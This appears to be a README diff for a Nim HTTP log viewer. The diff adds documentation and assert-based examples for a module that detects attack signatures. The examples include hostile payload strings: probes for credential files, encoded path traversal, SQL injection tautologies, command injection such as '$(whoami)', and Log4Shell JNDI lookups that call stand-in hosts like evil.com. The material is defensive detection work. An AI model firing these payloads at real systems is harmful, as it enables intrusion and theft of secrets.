@@ -87,6 +87,7 @@ High-performance HTTP log viewer and rogue bot detector written in Nim. `http_lo
   - [IP-to-Country Lookup & GeoIP Enrichment](#7-ip-to-country-lookup--geoip-enrichment)
   - [Unicode Regional Indicator Flags & Country Metadata](#8-unicode-regional-indicator-flags--country-metadata)
   - [Bogon, Private, and Loopback IP Handling](#9-bogon-private-and-loopback-ip-handling)
+  - [Attack Signature & Payload Detection](#10-attack-signature--payload-detection)
 - [Examples](#examples)
 - [Development and Documentation](#development-and-documentation)
 - [Attribution and License](#attribution-and-license)
@@ -598,6 +599,70 @@ nim r --path:src examples/bogon_and_private_ip.nim
 
 ---
 
+### 10. Attack Signature & Payload Detection
+
+The `http_logviewer/analyzer/signatures` module implements high-precision pattern recognition and payload analysis to detect automated vulnerability probes, exploit scanners, and OWASP Top 10 attack vectors embedded in URI paths and query parameters:
+
+- **Sensitive File Probes**: Detects requests for environment secrets (`.env`, `.env.local`), version control directories (`.git/config`, `.git/HEAD`), cryptographic keys (`id_rsa`, `.ssh/id_rsa`), Docker compositions (`docker-compose.yml`), cloud credentials (`.aws/credentials`), database dumps (`backup.sql`, `dump.sql`), and framework health/actuator endpoints (`/actuator/env`).
+- **CMS & Web Admin Exploits**: Flags targeted attacks against popular CMS platforms and administrative portals, including WordPress (`/wp-login.php`, `/xmlrpc.php`, `/wp-admin/`), database managers (`/phpmyadmin`, `/pma/`, `/admin/pma/`), router interfaces (`/boaform/admin/`), and debugger endpoints (`/telescope/requests`).
+- **Directory Traversal**: Identifies single-encoded, double-encoded, and obfuscated path traversal attempts (`../`, `..\`, `%2e%2e%2f`, `%252e%252e%252f`, `%2e%2e%5c`), along with direct probes targeting sensitive Unix/Windows files (`/etc/passwd`, `/etc/shadow`, `/boot.ini`, `windows/win.ini`).
+- **SQL Injection (SQLi)**: Identifies classic SQL injection syntax, including `UNION SELECT` variations, boolean tautologies (`' or '1'='1`, `' or 1=1`), blind timing delays (`waitfor delay`, `sleep()`, `benchmark()`), and metadata schema probes (`information_schema`).
+- **Remote Code Execution (RCE) & Command Injection**: Catches shell invocations and command chaining (`;id`, `|id`, `` `id` ``, `$(whoami)`, `;whoami`), binary paths (`/bin/sh`, `/bin/bash`, `cmd.exe`), and dangerous language interpreters (`eval()`, `base64_decode()`, `system()`).
+- **Log4j / JNDI Probes**: Recognizes Log4Shell JNDI injection patterns (`${jndi:ldap://`, `${jndi:rmi://`, `${jndi:dns://`) including obfuscated lookup evasion (`${${lower:j}ndi:`).
+- **OWASP Top 10 Multi-Vector Analysis**: Provides comprehensive scanners (`scanAttackSignatures`, `analyzeAttackPayload`) that inspect URI paths and queries, map findings to typed `ThreatFlag` sets, and provide actionable signature descriptors.
+
+```nim
+import http_logviewer/analyzer/signatures
+import http_logviewer/core/types
+
+# 1. Sensitive file probes
+assert isSensitiveFileProbe("/.env")
+assert isSensitiveFileProbe("/.git/config")
+assert isSensitiveFileProbe("/index.php?download=wp-config.php")
+
+# 2. CMS exploit probes
+assert isCmsExploit("/wp-login.php")
+assert isCmsExploit("/phpmyadmin/index.php")
+
+# 3. Directory traversal
+assert isDirectoryTraversal("/../../../etc/passwd")
+assert isDirectoryTraversal("/%252e%252e%252fboot.ini")
+
+# 4. SQL injection
+assert isSqlInjection("/search?q=1+union+select+1,2,3")
+assert isSqlInjection("/login?user=' or '1'='1")
+
+# 5. Command injection and RCE
+assert isCommandInjection("/cgi-bin/ping?ip=127.0.0.1;id")
+assert isCommandInjection("/lookup?h=$(whoami)")
+
+# 6. Log4j / JNDI injection
+assert isLog4jJndi("/?token=${jndi:ldap://evil.com/x}")
+assert isLog4jJndi("/?q=${${lower:j}ndi:dns://bad.org}")
+
+# 7. Composite analysis
+let (flags, matches) = analyzeAttackPayload("/wp-login.php?redirect=..%2f..%2f.env&query=' union select 1,2,3--")
+assert ThreatCmsExploit in flags
+assert ThreatDirectoryTraversal in flags
+assert ThreatSensitiveFile in flags
+assert ThreatSqlInjection in flags
+```
+
+#### Terminal Demonstration
+
+The recording below demonstrates sensitive file probe detection, CMS exploit tracking, directory traversal decoding, SQLi heuristics, command injection filtering, Log4j detection, and multi-vector payload analysis:
+
+![Attack Signatures and Hostile Payload Detection](docs/images/attack_signatures_and_payloads.gif)
+
+> *Source session recording:* [`docs/recordings/attack_signatures_and_payloads.cast`](docs/recordings/attack_signatures_and_payloads.cast) *(recorded with Asciinema, rendered via Agg with JetBrainsMono Nerd Font Mono)*.
+
+Compile and run this example:
+```bash
+nim r --path:src examples/attack_signatures_and_payloads.nim
+```
+
+---
+
 ## Examples
 
 The `examples/` folder provides executable demonstrations of each pipeline layer:
@@ -612,6 +677,7 @@ The `examples/` folder provides executable demonstrations of each pipeline layer
 - [`examples/ip_to_country_lookup.nim`](examples/ip_to_country_lookup.nim): Comprehensive IP-to-Country geolocation, offline CIDR lookups, MaxMind MMDB parsing, LRU cache benchmarks, and bogon LAN detection.
 - [`examples/flags_and_country_metadata.nim`](examples/flags_and_country_metadata.nim): Algorithmic ISO country flag emojis, 249 country name resolutions, security pseudo-codes, and terminal ASCII fallback.
 - [`examples/bogon_and_private_ip.nim`](examples/bogon_and_private_ip.nim): Comprehensive RFC 1918, loopback, link-local, CGNAT, multicast, bogon reserved networks, and local traffic markers.
+- [`examples/attack_signatures_and_payloads.nim`](examples/attack_signatures_and_payloads.nim): Hostile attack signatures, OWASP Top 10 vectors, sensitive file probes, CMS exploits, directory traversal, SQLi, RCE, and Log4j detection.
 - [`examples/pipeline_scaffolding.nim`](examples/pipeline_scaffolding.nim): Cross-module pipeline event envelope demonstration.
 
 ---
